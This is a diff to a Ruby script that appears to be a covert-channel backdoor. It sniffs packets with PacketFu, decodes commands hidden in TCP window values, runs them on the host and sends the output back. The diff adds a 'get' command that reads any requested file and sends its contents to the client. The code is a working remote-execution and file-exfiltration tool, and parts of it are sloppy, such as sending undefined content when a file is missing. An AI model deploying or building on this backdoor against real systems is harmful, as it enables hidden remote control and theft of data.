@@ -24,7 +24,9 @@ end
 # the server? Configure server settings? Restart script?
 #
 # -----------------------------------------------------------------------------------------
+
 def listen()
+
 	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :filter => @options[:filter], :promisc => true)
 	command = nil
 
@@ -33,12 +35,16 @@ def listen()
 		if PacketFu::TCPPacket.can_parse?(pkt) then
 
 			packet = PacketFu::Packet.parse(pkt)
-
+    
 				# if a FIN comes in then we have our complete command
 				if packet.tcp_flags.fin == 1 then
-                    puts command
-                    exec_command(command, packet)
-				    
+                    commands = command.split(' ')
+
+                    if commands[0] == "get" then
+                        send_file(commands[1], packet)
+                    else
+                        exec_command(command, packet)
+				    end
 				else #not a fin packet recieved
 					if command.nil? then
 						command = decode(packet.tcp_win)
@@ -47,8 +53,7 @@ def listen()
 					end
 				end #FIN
 		end #can parse
-	end #capture
-		
+	end #capture	
 end
 
 # -----------------------------------------------------------------------------------------
@@ -67,6 +72,7 @@ end
 # Executes a command on the server, grabes the output and sends it back to the client.
 #
 # -----------------------------------------------------------------------------------------
+
 def exec_command(command, packet)
 
     begin
@@ -79,6 +85,29 @@ def exec_command(command, packet)
 	send_data(result, packet)
 	listen()
 	
+end
+# -----------------------------------------------------------------------------------------
+# Send a file back to the client
+#    
+# Executes a command on the server, grabes the output and sends it back to the client.
+#
+# -----------------------------------------------------------------------------------------
+
+def send_file(filename, packet)
+    
+    if File.exist?(filename) then
+        file = File.open(filename, "rb")
+        content = file.read
+        file.close
+    else # exist?
+        send_data("#", packet)
+    end # exist? else
+
+    send_data(filename, packet)
+    send_data(content, packet)
+    puts "Sent #{filename}"
+    return
+    
 end
 
 # -----------------------------------------------------------------------------------------
@@ -119,6 +148,7 @@ end
 #    Application entry point. Get options, make root, and waits for input
 #
 # -----------------------------------------------------------------------------------------
+
 @options = {}
 
 # Set defaults for options
@@ -151,7 +181,9 @@ if @options[:filter] == '' then
 
 end
 @options[:ifconfig] = PacketFu::Utils.whoami?(:iface => @options[:iface])
-listen()
+begin
+    listen()
+rescue Interrupt
+    exit()
 end
-
 
